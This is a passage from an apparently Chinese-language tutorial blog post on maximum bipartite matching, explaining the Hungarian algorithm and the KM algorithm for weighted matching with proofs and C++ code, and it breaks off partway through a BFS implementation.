<p>通过上面的概念，我们不难发现增广路径有一个十分重要的性质：<strong>非匹配边比匹配边多一条</strong>。因此，研究增广路径的意义是<strong>改进匹配</strong>。如果我们把增广路径中的非匹配边和匹配边交换，这样做不仅不会破坏匹配本身的性质（因为增广路径中所有的匹配边并不存在与其他点相连的匹配边），而且交换后匹配边的数目还会比原来多 <span class="math inline">\(1\)</span> 条。</p>
<p>如果我们不停地寻找增广路径，并在每一次找到增广路径后交换增广路径中的匹配点和非匹配点以增加匹配边的数目，这样直到再也找不到增广路径时，我们就得到了该二分图的最大匹配。这就是<strong>匈牙利算法</strong>的本质，因此有时我们也称其为<strong>增广路算法</strong>。</p>
<hr />
<ol style="list-style-type: decimal">
<li>设 <span class="math inline">\(S = \varnothing\)</span>，即把所有边都标记为未匹配边。</li>
<li>寻找增广路径，接着把其上所有边的状态取反（即把匹配边都标记为未匹配边，未匹配边都标记为匹配边）。</li>
<li>重复第 2 步，直到再也无法在图中找到增广路径。</li>
</ol>
<p>显然，该算法的关键在于如何寻找增广路径。</p>
<p>匈牙利算法尝试<strong>给每一个左部节点 <span class="math inline">\(x\)</span> 寻找一个右部节点 <span class="math inline">\(y\)</span></strong>。右部节点 <span class="math inline">\(y\)</span> 能够与左部节点 <span class="math inline">\(x\)</span> 匹配，需要满足如下两个条件之一：</p>
<ol style="list-style-type: decimal">
<li><strong><span class="math inline">\(y\)</span> 本身就是非匹配点</strong>。在这种情况下，<span class="math inline">\(x - y\)</span> 本身就是一条非匹配边，则是一条长度为 <span class="math inline">\(1\)</span> 的增广路径。</li>
<li><strong><span class="math inline">\(y\)</span> 已经与左部点 <span class="math inline">\(x&#39;\)</span> 匹配，但从 <span class="math inline">\(x&#39;\)</span> 出发能找到另一个右部节点 <span class="math inline">\(y&#39;\)</span> 与之匹配</strong>。在这种情况下，<span class="math inline">\(x - y - x&#39; - y&#39;\)</span> 为一条增广路径。</li>
</ol>
<p>我们可以使用 <strong>深度优先搜素 (DFS)</strong> 来递归地从左部节点 <span class="math inline">\(x\)</span> 出发寻找增广路径。若找到，则在回溯的时候把路径上的匹配状态取反。另外，在每一次搜索时，我们可以开一个 <code>bool</code> 数组来记录每个右部节点的访问情况，以避免重复搜索。</p>
<hr />
<p>下面我们举一个例子来演示匈牙利算法的大致过程（请配合图片下方的一段文字说明食用）：</p>
<div class="figure">
<img src="/posts/icpc-notes/hungarian-algorithm/hungarian-unweighted-demo.png" alt="" />
<p class="caption">匈牙利算法样例</p>
</div>
<p>首先，我们从左1出发，找到右1，发现这两点可以匹配（满足条件1）。至此，我们找到了一条增广路径。在回溯时，我们将这条未匹配边标记为匹配边（见图2）。</p>
<p>然后，我们从左2出发，先找到右1，发现它已经与左1匹配了。接着我们递归，尝试给与之匹配的左1另外找一个匹配点。但是我们找不到，因此匹配失败（不满足条件2，见图3）。接着，我们找到右3并匹配成功，找到增广路径，回溯时将该边标记为匹配边（见图4）。</p>
<p>接着，我们从左3出发，找到右2，匹配成功（满足条件1），找到增广路径，回溯时标记该边为匹配边（见图5）。</p>
<p>最后，我们从左4出发，找到右3，发现它已经与左2匹配了。接着我们递归，尝试给与之匹配的左2另外找一个匹配点，我们找到了右4，找到增广路径（满足条件2），回溯并将增广路径上的所有非匹配边标记为匹配边。</p>
<p>至此，我们便找到了最大匹配，算法完成。</p>
<p>另外，插句嘴，对于上例这种所有点最后都成匹配点的匹配，我们称其为<strong>完备匹配</strong>。</p>
</div>
<div id="正确性" class="section level2">
<h2>正确性</h2>
<p>匈牙利算法实际上基于<strong>贪心策略</strong>。它的一个重要特点是：当一个节点成为匹配点后，至多因为找到增广路而更换匹配对象，但是<strong>绝对不会从匹配点变成非匹配点</strong>。</p>
<p>如果要更详细地说明，我们可以从反证法考虑：</p>
<p>假设存在这样的<strong>非最大匹配</strong>，在其中已经无法找到增广路径。</p>
<p><span class="math inline">\(\because\)</span> 当前匹配不是最大匹配</p>
<p><span class="math inline">\(\therefore\)</span> 左右部均至少存在一个非匹配点</p>
<p>对于这两个非匹配点，我们可以分两种情况讨论：</p>
<ul>
<li><strong>若这两个点间存在一条边</strong>： 那么我们就找到了一条增广路径，与假设矛盾；</li>
<li><strong>若这两个点间不存在边：</strong>
<ul>
<li><strong>若这两个点可以与已有的匹配点相连</strong>：那么我们完全可以将其加入增广路径里，与假设矛盾；</li>
<li><strong>若这两个点不能与已有匹配点相连</strong>：那么这两个点无法增加图中匹配边的数量，也就是说我们已经找到最大匹配了，与假设矛盾。</li>
</ul></li>
</ul>
<p>对于每个左部节点，寻找增广路最多遍历一次整张二分图，因此该算法的复杂度为 <span class="math inline">\(\mathcal{O}(NM)\)</span>。</p>
</div>
<div id="代码-c" class="section level2">
<h2>代码 (C++)</h2>
<p><strong>几点说明</strong>：</p>
<p>在代码样例中 <span class="math inline">\(\text{fst}\)</span> 代表左部元素（first 的缩写），<span class="math inline">\(\text{snd}\)</span> 代表右部元素（second 的缩写）。</p>
<p><span class="math inline">\(\text{arr}\)</span> 是存边的邻接矩阵。例如，<span class="math inline">\(\text{arr}[i][j] == true\)</span> 意味着左部点 <span class="math inline">\(i\)</span> 和右部点 <span class="math inline">\(j\)</span> 间存在一条无权边。</p>
<p><span class="math inline">\(\text{sndMatch}\)</span> 记录与右部节点相匹配的左部节点（即记录当前的所有匹配边）。例如，<span class="math inline">\(\text{sndMatch}[j] == i\)</span> 意味着左部 <span class="math inline">\(i\)</span> 节点和右部 <span class="math inline">\(j\)</span> 结点间存在一条匹配边。在刚开始时我们将该数组所有元素初始化为 <span class="math inline">\(-1\)</span>，代表所有边开始时都是未匹配边。</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb1-1"><a href="#cb1-1"></a><span class="dt">bool</span> arr[SIZE][SIZE], sndVisited[SIZE];</span>
<span id="cb1-2"><a href="#cb1-2"></a><span class="dt">int</span> sndMatch[SIZE];</span>
<span id="cb1-3"><a href="#cb1-3"></a><span class="dt">int</span> fstNum, sndNum;</span>
<span id="cb1-4"><a href="#cb1-4"></a></span>
<span id="cb1-5"><a href="#cb1-5"></a><span class="co">// Find snd vertex for fst vertex</span></span>
<span id="cb1-6"><a href="#cb1-6"></a><span class="dt">bool</span> canFind(<span class="dt">int</span> fstId) {</span>
<span id="cb1-7"><a href="#cb1-7"></a>    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">0</span>; i &lt; sndNum; i++) {</span>
<span id="cb1-8"><a href="#cb1-8"></a>        <span class="co">// If edge exists and snd vertex has not been visited</span></span>
<span id="cb1-9"><a href="#cb1-9"></a>        <span class="cf">if</span> (arr[fstId][i] &amp;&amp; !sndVisited[i]) {</span>
<span id="cb1-10"><a href="#cb1-10"></a>            sndVisited[i] = <span class="kw">true</span>;</span>
<span id="cb1-11"><a href="#cb1-11"></a>            <span class="co">// Two conditions mentioned above</span></span>
<span id="cb1-12"><a href="#cb1-12"></a>            <span class="cf">if</span> (sndMatch[i] == -<span class="dv">1</span> || canFind(sndMatch[i])) {</span>
<span id="cb1-13"><a href="#cb1-13"></a>                sndMatch[i] = fstId;</span>
<span id="cb1-14"><a href="#cb1-14"></a>                <span class="cf">return</span> <span class="kw">true</span>;</span>
<span id="cb1-15"><a href="#cb1-15"></a>            }</span>
<span id="cb1-16"><a href="#cb1-16"></a>        }</span>
<span id="cb1-17"><a href="#cb1-17"></a>    }</span>
<span id="cb1-18"><a href="#cb1-18"></a>    <span class="cf">return</span> <span class="kw">false</span>;</span>
<span id="cb1-19"><a href="#cb1-19"></a>}</span>
<span id="cb1-20"><a href="#cb1-20"></a></span>
<span id="cb1-21"><a href="#cb1-21"></a><span class="dt">int</span> hungarian() {</span>
<span id="cb1-22"><a href="#cb1-22"></a>    <span class="dt">int</span> ans = <span class="dv">0</span>;    <span class="co">// Number of edges in maximum bipartite matching</span></span>
<span id="cb1-23"><a href="#cb1-23"></a>    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">0</span>; i &lt; fstNum; i++) {</span>
<span id="cb1-24"><a href="#cb1-24"></a>        <span class="co">// Initialize every snd vertex as unvisited</span></span>
<span id="cb1-25"><a href="#cb1-25"></a>        memset(sndVisited, <span class="kw">false</span>, <span class="kw">sizeof</span>(sndVisited));</span>
<span id="cb1-26"><a href="#cb1-26"></a>        <span class="cf">if</span> (canFind(i)) {</span>
<span id="cb1-27"><a href="#cb1-27"></a>            ans++;</span>
<span id="cb1-28"><a href="#cb1-28"></a>        }</span>
<span id="cb1-29"><a href="#cb1-29"></a>    }</span>
<span id="cb1-30"><a href="#cb1-30"></a>    <span class="cf">return</span> ans;</span>
<span id="cb1-31"><a href="#cb1-31"></a>}</span></code></pre></div>
</div>
</div>
<div id="数个名词" class="section level1">
<h1>数个名词</h1>
<div id="交错树" class="section level2">
<h2>交错树</h2>
<p>在上面提到的算法中，如果从某个左部节点出发寻找匹配失败，那么在 DFS 的过程中，所有<strong>访问过的节点</strong>以及<strong>为了访问这些节点而经过的边</strong>可以构成一棵树。</p>
<p>我们不难发现，这棵树的根是一个左部节点，所有的叶子节点也是左部节点（因为最终匹配失败），并且树上的奇数层边均为非匹配边，偶数层边均为匹配边。因此我们把这棵树称作<strong>交错树</strong>。</p>
<p>为了方便理解，下面简单举个例子：</p>
<div class="figure">
<img src="/posts/icpc-notes/hungarian-algorithm/alternating-tree-demo.png" alt="" />
<p class="caption">交错树样例</p>
</div>
</div>
<div id="顶标" class="section level2">
<h2>顶标</h2>
<p><strong>顶标，全称顶点标记值</strong>。在二分图中，我们给左部节点一个整数值 <span class="math inline">\(A_i\)</span>，给第 <span class="math inline">\(j\)</span> 个右部节点一个整数值 <span class="math inline">\(B_j\)</span>。同时，必须满足：</p>
<p><span class="math display">\[
\forall i, j, A_i + B_j \geq w(i, j)
\]</span></p>
<p>其中，<span class="math inline">\(w(i, j)\)</span> 表示连接 <span class="math inline">\(i, j\)</span> 两点边的权重（如果没有边可设作负无穷）。这些整数 <span class="math inline">\(A_i, B_j\)</span> 称作节点的<strong>顶标</strong>。</p>
</div>
<div id="相等子图" class="section level2">
<h2>相等子图</h2>
<p><strong>相等子图</strong>是原图的一个<em>生成子图</em>（即包含原图的所有节点，但是不包含所有的边），并且该生成子图中只包含满足下述条件的边：</p>
<p><span class="math display">\[
A_i + B_j = w(i, j)
\]</span>
其中，<span class="math inline">\(A_i\)</span> 是左部 <span class="math inline">\(i\)</span> 点的顶标，<span class="math inline">\(B_j\)</span> 是右部 <span class="math inline">\(j\)</span> 点的顶标，<span class="math inline">\(w(i, j)\)</span> 则是连接 <span class="math inline">\(i, j\)</span> 两点边的权重。</p>
<p>下面我们来看看与之相关的一个定理：</p>
<blockquote>
<p>若相等子图存在完备匹配，则这个完备匹配就是二分图的最大匹配。</p>
</blockquote>
<p>我们简要地证明一下：</p>
<p>在相等子图中，完备匹配的边权之和为：</p>
<p><span class="math display">\[
\sum\limits_{i = 1}^{N} (A_i + B_i)
\]</span>
也就是所有顶标之和。</p>
<p><span class="math inline">\(\because\)</span> 顶标满足：</p>
<p><span class="math display">\[
\forall i, j: \ A_i + B_j \geq w(i, j)
\]</span></p>
<p><span class="math inline">\(\therefore\)</span> 在整个二分图中，任何一组匹配的边权都不可能大于所有顶标的和。</p>
</div>
</div>
<div id="带权二分图最大匹配" class="section level1">
<h1>带权二分图最大匹配</h1>
<p>带权二分图最大权匹配问题的算法叫 “KM算法”</p>
<div id="思想-1" class="section level2">
<h2>思想</h2>
<p>我们不妨先给每个节点随意赋值一个顶标（我们可以赋值 <span class="math inline">\(A_i = \max\limits_{i \leq j \leq N} \{ w(i, j) \}, B_j = 0\)</span>）。接着，我们采取适当的策略不断扩大相等子图的规模，直至相等子图中存在完备匹配。这样，依据上面的定理，我们便找到了最大权匹配。</p>
<p>根据上面的思想我们不难发现，<strong>该算法默认了带权最大匹配一定是完备匹配</strong>，因此该算法仅适用于满足“最大匹配一定是完备匹配”的图，而更一般的情况则需要采用费用流来计算最大权匹配。基于此，即使该算法在处理稠密图时有稍高的效率，我们还是建议在遇到相关问题的时候采用费用流。</p>
<hr />
<ol style="list-style-type: decimal">
<li>初始化顶标的值：<span class="math inline">\(A_i = \max\limits_{i \leq j \leq N}{w(i, j)}, \ B_j = 0\)</span>；</li>
<li>用“无权二分图的最大匹配”中提到的算法寻找相等子图的完备匹配；</li>
<li>若未找到增广路径则采用适当策略修改顶标的值；</li>
<li>重复上述 2、3 直到找到相等子图的完备匹配为止。</li>
</ol>
<p>至于如何再相等子图中寻找完备匹配，我们可以采用上一节“无权二分图的最大匹配”中提到的算法来寻找该相等子图的最大匹配。如果最大匹配不完备，则说明至少有一个左部节点匹配失败。而节点匹配失败那次所进行的 DFS 并形成了一颗交错树，我们记之为 <span class="math inline">\(T\)</span>。</p>
<p>结合寻找最大匹配的过程，不难发现以下结论：</p>
<ul>
<li>除了根节点以外，<span class="math inline">\(T\)</span> 中其它的左部节点都是<strong>从右部点沿着匹配边</strong>访问到的，即在程序中调用了 <code>canFind(sndMatch[i])</code>，其中 <span class="math inline">\(i\)</span> 是一个右部节点，<code>sndMatch[i]</code> 则是曾与之匹配的左部节点。</li>
<li><span class="math inline">\(T\)</span> 中所有右部点都是<strong>从左部点沿着非匹配边</strong>访问到的。</li>
</ul>
<p>在寻找增广路径以前，我们并不会改变已有的匹配，所以一个右部点沿着匹配边能访问到的左部点是固定的。为了让匹配数增加，我们只能从第 2 条结论入手，考虑<strong>怎样让左部节点沿着非匹配边访问到更多右部点</strong>。</p>
<p>假如我们把交错树 <span class="math inline">\(T\)</span> 中的所有左部节点顶标 <span class="math inline">\(A_i (i \in T)\)</span> 减小一个整数值 <span class="math inline">\(\Delta\)</span>，把 <span class="math inline">\(T\)</span> 中所有右部节点顶标 <span class="math inline">\(B_j (j \in T)\)</span> 增大一个整数值 <span class="math inline">\(\Delta\)</span>，节点的访问情况会有哪些变化？我们可以分两方面进行讨论：</p>
<ul>
<li><strong>右部点 <span class="math inline">\(j\)</span> 沿着匹配边，递归访问 <span class="math inline">\(i = \text{sndMatch}[j]\)</span> 的情形</strong>。对于一条连接左部点 <span class="math inline">\(i\)</span> 和右部点 <span class="math inline">\(j\)</span> 的匹配边，显然要么 <span class="math inline">\(i, j \in T\)</span>（被访问到了），要么 <span class="math inline">\(i, j \notin T\)</span>（没被访问到）。因此 <span class="math inline">\(A_i + B_j\)</span> 不变，匹配边仍然属于相等子图。</li>
<li><strong>左部点 <span class="math inline">\(i\)</span> 沿着非匹配边，访问右部点 <span class="math inline">\(j\)</span> 并尝试与之匹配的情形</strong>。由于左部点是被动的（被右部点沿着匹配边递归），因此 <span class="math inline">\(i \in T\)</span>。
<ul>
<li>若 <span class="math inline">\(i, j \in T\)</span> ，显然 <span class="math inline">\(A_i + B_j\)</span> 不变，即以前能从 <span class="math inline">\(i\)</span> 访问到 <span class="math inline">\(j\)</span>，现在仍能访问。</li>
<li>若 <span class="math inline">\(i \in T, j \notin T\)</span>，则 <span class="math inline">\(A_i + B_j\)</span> 减小。即以前从 <span class="math inline">\(i\)</span> 访问不到 <span class="math inline">\(j\)</span>，现在有可能访问到了。</li>
</ul></li>
</ul>
<p>为了保证顶标符合前提条件 <span class="math inline">\(\forall i, j, A_i + B_j \leq w(i, j)\)</span>，我们就在所有 <span class="math inline">\(i \in T, j \notin T\)</span> 的边 <span class="math inline">\((i, j)\)</span> 之中，找出最小的 <span class="math inline">\(A_i + B_j - w(i, j)\)</span> 作为 <span class="math inline">\(\Delta\)</span> 值。只要原图存在完备匹配，这样的边一定存在。上述方法及不会破坏前提条件，又能保证至少有一条新的边会加入相等子图，使得交错树中至少一个左部点能访问到的右部点增多。</p>
<p>至于例子…… 懒得画了，推荐大家参考一下下面提到的那篇博文（逃</p>
<p>不好理解？如果你只对算法过程比较感兴趣而暂时不需要具体理解算法原理，在这里强烈推荐一篇博文：<a href="http://www.cnblogs.com/wenruo/p/5264235.html">KM算法详解+模板</a>，其中作者用极其新颖而易懂的模型解释了算法的具体流程（其实我最早就是参照这篇博文来学的🙈）。</p>
<p>时间复杂度为 <span class="math inline">\(\mathcal{O}(N^3)\)</span> 级别。</p>
</div>
<div id="几点变形" class="section level2">
<h2>几点变形</h2>
<p>这部分内容是我自己在做题的 YY 出来的，如果错误恳请指正。</p>
<ol style="list-style-type: decimal">
<li>如果要求最小权匹配，可以直接把边权去成负数，得出答案后再取绝对值。</li>
<li>对于部分找不到结果要求输出 -1 的题目，为了避免死循环，当执行 “在所有 <span class="math inline">\(i \in T, j \notin T\)</span> 的边 <span class="math inline">\((i, j)\)</span> 之中找出最小的 <span class="math inline">\(A_i + B_j - w(i, j)\)</span>” 时，如果发现找不到，就说明没有满足要求的结果，这个时候就可以直接 <code>return -1;</code> 了。</li>
<li>【正确性未知】对于不满足“带权最大匹配一定是完备匹配”这一特性的图，我们可以将不存在的边都当作边权为 -INF 的边（这样就可以保证一定可以找出最大权完备匹配），然后我们再在计算最大权的时候剔除长为 -INF 的边，这样剩下的匹配应该就是最大权匹配。</li>
</ol>
</div>
<div id="代码-c-1" class="section level2">
<h2>代码 (C++)</h2>
<p><strong>几点说明</strong>：</p>
<p>在代码样例中 <span class="math inline">\(\text{fst}\)</span> 代表左部元素（first 的缩写），<span class="math inline">\(\text{snd}\)</span> 代表右部元素（second 的缩写）。</p>
<p><span class="math inline">\(\text{arr}\)</span> 是描存边的邻接矩阵。例如，<span class="math inline">\(\text{arr}[i][j] = k\)</span> 代表左部点 <span class="math inline">\(i\)</span> 与右部点 <span class="math inline">\(j\)</span> 之前存在一条权重为 <span class="math inline">\(k\)</span> 的边。至于不存在的边，我们令 <span class="math inline">\(\text{arr}[i][j] = -\infty\)</span>。</p>
<p><span class="math inline">\(\text{fstEx}\)</span> 和 <span class="math inline">\(\text{sndEx}\)</span> 则分别记录了左部何右部每个点的顶标值。</p>
<p><span class="math inline">\(\text{sndMatch}\)</span> 记录与右部节点相匹配的左部节点（即记录当前的所有匹配边）。例如，<span class="math inline">\(\text{sndMatch}[j] == i\)</span> 意味着左部 <span class="math inline">\(i\)</span> 节点和右部 <span class="math inline">\(j\)</span> 结点间存在一条匹配边。在刚开始时我们将该数组所有元素初始化为 <span class="math inline">\(-1\)</span>，代表所有边开始时都是未匹配边。</p>
<p><span class="math inline">\(\text{sndNeed}\)</span> 则是记录当前寻找最大匹配过程中每一次找到找到满足 <span class="math inline">\(i \in T, j \notin T\)</span> 的边 <span class="math inline">\((i, j)\)</span> 时的 <span class="math inline">\(\Delta\)</span> 值： <span class="math inline">\(A_i + B_j - w(i, j)\)</span>。这个数组会在寻找最小 <span class="math inline">\(\Delta\)</span> 值的时候用到。</p>
<div id="dfs-版本" class="section level3">
<h3>DFS 版本</h3>
<p>注：DFS 版本最坏时间复杂度可能高达 <span class="math inline">\(\mathcal{O}(N^4)\)</span>，所以一般建议使用下文中的 BFS 版本（该结论引用自：<a href="https://blog.csdn.net/c20182030/article/details/73330556">【原创】KM算法的Bfs写法</a>）。</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb2-1"><a href="#cb2-1"></a><span class="dt">int</span> arr[SIZE][SIZE];</span>
<span id="cb2-2"><a href="#cb2-2"></a><span class="dt">int</span> fstEx[SIZE], sndEx[SIZE];</span>
<span id="cb2-3"><a href="#cb2-3"></a><span class="dt">int</span> sndMatch[SIZE], sndNeed[SIZE];</span>
<span id="cb2-4"><a href="#cb2-4"></a><span class="dt">bool</span> fstVisited[SIZE], sndVisited[SIZE];</span>
<span id="cb2-5"><a href="#cb2-5"></a><span class="dt">int</span> sndNum, fstNum;</span>
<span id="cb2-6"><a href="#cb2-6"></a></span>
<span id="cb2-7"><a href="#cb2-7"></a><span class="dt">bool</span> canFind(<span class="dt">int</span> fstId) {</span>
<span id="cb2-8"><a href="#cb2-8"></a>    fstVisited[fstId] = <span class="kw">true</span>;</span>
<span id="cb2-9"><a href="#cb2-9"></a>    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">0</span>; i &lt; sndNum; i++) {</span>
<span id="cb2-10"><a href="#cb2-10"></a>        <span class="cf">if</span> (sndVisited[i]) {</span>
<span id="cb2-11"><a href="#cb2-11"></a>            <span class="cf">continue</span>;</span>
<span id="cb2-12"><a href="#cb2-12"></a>        }</span>
<span id="cb2-13"><a href="#cb2-13"></a>        <span class="dt">int</span> delta = fstEx[fstId] + sndEx[i] - arr[fstId][i];</span>
<span id="cb2-14"><a href="#cb2-14"></a>        <span class="cf">if</span> (delta == <span class="dv">0</span>) {</span>
<span id="cb2-15"><a href="#cb2-15"></a>            sndVisited[i] = <span class="kw">true</span>;</span>
<span id="cb2-16"><a href="#cb2-16"></a>            <span class="cf">if</span> (sndMatch[i] == -<span class="dv">1</span> || canFind(sndMatch[i])) {</span>
<span id="cb2-17"><a href="#cb2-17"></a>                sndMatch[i] = fstId;</span>
<span id="cb2-18"><a href="#cb2-18"></a>                <span class="cf">return</span> <span class="kw">true</span>;</span>
<span id="cb2-19"><a href="#cb2-19"></a>            }</span>
<span id="cb2-20"><a href="#cb2-20"></a>        } <span class="cf">else</span> {</span>
<span id="cb2-21"><a href="#cb2-21"></a>            sndNeed[i] = min(sndNeed[i], delta);</span>
<span id="cb2-22"><a href="#cb2-22"></a>        }</span>
<span id="cb2-23"><a href="#cb2-23"></a>    }</span>
<span id="cb2-24"><a href="#cb2-24"></a>    <span class="cf">return</span> <span class="kw">false</span>;</span>
<span id="cb2-25"><a href="#cb2-25"></a>}</span>
<span id="cb2-26"><a href="#cb2-26"></a></span>
<span id="cb2-27"><a href="#cb2-27"></a><span class="dt">int</span> hungarian() {</span>
<span id="cb2-28"><a href="#cb2-28"></a>    memset(sndMatch, -<span class="dv">1</span>, <span class="kw">sizeof</span>(sndMatch));</span>
<span id="cb2-29"><a href="#cb2-29"></a>    memset(sndEx, <span class="dv">0</span>, <span class="kw">sizeof</span>(sndEx));</span>
<span id="cb2-30"><a href="#cb2-30"></a></span>
<span id="cb2-31"><a href="#cb2-31"></a>    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">0</span>; i &lt; fstNum; i++) {</span>
<span id="cb2-32"><a href="#cb2-32"></a>        fstEx[i] = arr[i][<span class="dv">0</span>];</span>
<span id="cb2-33"><a href="#cb2-33"></a>        <span class="cf">for</span> (<span class="dt">int</span> j = <span class="dv">1</span>; j &lt; sndNum; j++) {</span>
<span id="cb2-34"><a href="#cb2-34"></a>            fstEx[i] = max(fstEx[i], arr[i][j]);</span>
<span id="cb2-35"><a href="#cb2-35"></a>        }</span>
<span id="cb2-36"><a href="#cb2-36"></a>    }</span>
<span id="cb2-37"><a href="#cb2-37"></a></span>
<span id="cb2-38"><a href="#cb2-38"></a>    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">0</span>; i &lt; fstNum; i++) {</span>
<span id="cb2-39"><a href="#cb2-39"></a>        <span class="cf">for</span> (<span class="dt">int</span> j = <span class="dv">0</span>; j &lt; sndNum; j++) {</span>
<span id="cb2-40"><a href="#cb2-40"></a>            sndNeed[j] = INF;</span>
<span id="cb2-41"><a href="#cb2-41"></a>        }</span>
<span id="cb2-42"><a href="#cb2-42"></a></span>
<span id="cb2-43"><a href="#cb2-43"></a>        <span class="cf">while</span> (<span class="kw">true</span>) {</span>
<span id="cb2-44"><a href="#cb2-44"></a>            memset(fstVisited, <span class="kw">false</span>, <span class="kw">sizeof</span>(fstVisited));</span>
<span id="cb2-45"><a href="#cb2-45"></a>            memset(sndVisited, <span class="kw">false</span>, <span class="kw">sizeof</span>(sndVisited));</span>
<span id="cb2-46"><a href="#cb2-46"></a></span>
<span id="cb2-47"><a href="#cb2-47"></a>            <span class="cf">if</span> (canFind(i)) {</span>
<span id="cb2-48"><a href="#cb2-48"></a>                <span class="cf">break</span>;</span>
<span id="cb2-49"><a href="#cb2-49"></a>            }</span>
<span id="cb2-50"><a href="#cb2-50"></a>            <span class="dt">int</span> minDelta = INF;</span>
<span id="cb2-51"><a href="#cb2-51"></a>            <span class="cf">for</span> (<span class="dt">int</span> j = <span class="dv">0</span>; j &lt; sndNum; j++) {</span>
<span id="cb2-52"><a href="#cb2-52"></a>                <span class="cf">if</span> (!sndVisited[j]) {</span>
<span id="cb2-53"><a href="#cb2-53"></a>                    minDelta = min(minDelta, sndNeed[j]);</span>
<span id="cb2-54"><a href="#cb2-54"></a>                }</span>
<span id="cb2-55"><a href="#cb2-55"></a>            }</span>
<span id="cb2-56"><a href="#cb2-56"></a></span>
<span id="cb2-57"><a href="#cb2-57"></a>            <span class="cf">for</span> (<span class="dt">int</span> j = <span class="dv">0</span>; j &lt; fstNum; j++) {</span>
<span id="cb2-58"><a href="#cb2-58"></a>                <span class="cf">if</span> (fstVisited[j]) {</span>
<span id="cb2-59"><a href="#cb2-59"></a>                    fstEx[j] -= minDelta;</span>
<span id="cb2-60"><a href="#cb2-60"></a>                }</span>
<span id="cb2-61"><a href="#cb2-61"></a>            }</span>
<span id="cb2-62"><a href="#cb2-62"></a>            <span class="cf">for</span> (<span class="dt">int</span> j = <span class="dv">0</span>; j &lt; sndNum; j++) {</span>
<span id="cb2-63"><a href="#cb2-63"></a>                <span class="cf">if</span> (sndVisited[j]) {</span>
<span id="cb2-64"><a href="#cb2-64"></a>                    sndEx[j] += minDelta;</span>
<span id="cb2-65"><a href="#cb2-65"></a>                } <span class="cf">else</span> {</span>
<span id="cb2-66"><a href="#cb2-66"></a>                    sndNeed[j] -= minDelta;</span>
<span id="cb2-67"><a href="#cb2-67"></a>                }</span>
<span id="cb2-68"><a href="#cb2-68"></a>            }</span>
<span id="cb2-69"><a href="#cb2-69"></a>        }</span>
<span id="cb2-70"><a href="#cb2-70"></a>    }</span>
<span id="cb2-71"><a href="#cb2-71"></a></span>
<span id="cb2-72"><a href="#cb2-72"></a>    <span class="dt">int</span> ans = <span class="dv">0</span>;</span>
<span id="cb2-73"><a href="#cb2-73"></a>    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">0</span>; i &lt; sndNum; i++) {</span>
<span id="cb2-74"><a href="#cb2-74"></a>        ans += arr[sndMatch[i]][i];</span>
<span id="cb2-75"><a href="#cb2-75"></a>    }</span>
<span id="cb2-76"><a href="#cb2-76"></a>    <span class="cf">return</span> ans;</span>
<span id="cb2-77"><a href="#cb2-77"></a>}</span></code></pre></div>
</div>
<div id="bfs-版本" class="section level3">
<h3>BFS 版本</h3>
<div class="sourceCode" id="cb3"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb3-1"><a href="#cb3-1"></a><span class="dt">int</span> arr[SIZE][SIZE];</span>
<span id="cb3-2"><a href="#cb3-2"></a><span class="dt">int</span> fstEx[SIZE], sndEx[SIZE];</span>
<span id="cb3-3"><a href="#cb3-3"></a><span class="dt">int</span> sndMatch[SIZE], sndNeed[SIZE], pre[SIZE];</span>
<span id="cb3-4"><a href="#cb3-4"></a><span class="dt">bool</span> sndVisited[SIZE];</span>
<span id="cb3-5"><a href="#cb3-5"></a><span class="dt">int</span> sndNum, fstNum;</span>
<span id="cb3-6"><a href="#cb3-6"></a></span>
<span id="cb3-7"><a href="#cb3-7"></a><span class="dt">void</span> bfs(<span class="dt">int</span> fstId) {</span>
<span id="cb3-8"><a href="#cb3-8"></a>    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">0</span>; i &lt; sndNum; i++) {</span>
<span id="cb3-9"><a href="#cb3-9"></a>        sndVisited[i] = <span class="kw">false</span>;</span>
<span id="cb3-10"><a href="#cb3-10"></a>        sndNeed[i] = INT_MAX;</span>
<span id="cb3-11"><a href="#cb3-11"></a>        pre[i] = -<span class="dv">1</span>;</span>
<span id="cb3-12"><a href="#cb3-12"></a>    }</span>
<span id="cb3-13"><a href="#cb3-13"></a></span>
<span id="cb3-14"><a href="#cb3-14"></a>    <span class="dt">int</span> cntSnd = -<span class="dv">1</span>;</span>
<span id="cb3-15"><a href="#cb3-15"></a>    <span class="cf">while</span> (cntSnd == -<span class="dv">1</span> || sndMatch[cntSnd] != -<span class="dv">1</span>) {</span>
<span id="cb3-16"><a href="#cb3-16"></a>        <span class="dt">int</span> cntFst;</span>
<span id="cb3-17"><a href="#cb3-17"></a>        <span class="cf">if</span> (cntSnd == -<span class="dv">1</span>) {</span>
<span id="cb3-18"><a href="#cb3-18"></a>            cntFst = fstId;</span>
<span id="cb3-19"><a href="#cb3-19"></a>        } <span class="cf">else</span> {</span>
<span id="cb3-20"><a href="#cb3-20"></a>            cntFst = sndMatch[cntSnd];</span>
<span id="cb3-21"><a href="#cb3-21"></a>            sndVisited[cntSnd] = <span class="kw">true</span>;</span>
<span id="cb3-22"><a href="#cb3-22"></a>        }</span>
<span id="cb3-23"><a href="#cb3-23"></a></span>
<span id="cb3-24"><a href="#cb3-24"></a>        <span class="dt">int</span> minDelta = INT_MAX, minSnd = -<span class="dv">1</span>;</span>
<span id="cb3-25"><a href="#cb3-25"></a>        <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">0</span>; i &lt; sndNum; i++) {</span>
<span id="cb3-26"><a href="#cb3-26"></a>            <span class="cf">if</span> (!sndVisited[i]) {</span>
<span id="cb3-27"><a href="#cb3-27"></a>                <span class="cf">if</span> (sndNeed[i] &gt; fstEx[cntFst] + sndEx[i] - arr[cntFst][i]) {</span>
<span id="cb3-28"><a href="#cb3-28"></a>                    sndNeed[i] = fstEx[cntFst] + sndEx[i] - arr[cntFst][i];</span>
<span id="cb3-29"><a href="#cb3-29"></a>                    pre[i] = cntSnd;</span>
<span id="cb3-30"><a href="#cb3-30"></a>                }</span>
<span id="cb3-31"><a href="#cb3-31"></a>                <span class="cf">if</span> (sndNeed[i] &lt; minDelta) {</span>
